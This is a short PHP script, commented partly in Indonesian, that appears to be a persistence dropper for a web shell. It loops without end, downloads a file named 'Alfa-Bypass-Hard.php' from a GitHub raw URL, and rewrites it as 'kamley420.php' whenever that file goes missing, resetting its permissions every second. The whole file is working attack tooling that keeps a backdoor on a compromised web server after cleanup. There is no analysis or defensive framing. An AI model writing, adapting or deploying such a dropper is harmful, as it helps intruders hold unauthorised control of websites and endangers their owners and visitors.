<?php
// Kamley77 Feat Hmei7
// Update V.0 to V.1

$link = "https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/Alfa-Bypass-Hard.php";
$file = "kamley420.php";

function shel($link, $file){
    $x = file_get_contents($link);
    $f = fopen($file, 'w');
    fwrite($f, $x);
    fclose($f);
}

while (1) {
    if (!file_exists($file)) {
        shel($link, $file);
    }

    // Pastikan permission file selalu 0644 (rw-r--r--)
    if (file_exists($file)) {
        chmod($file, 0644);
        echo "Permission file '$file' di-set ke 0644\n";
    }

    sleep(1);
}
?>
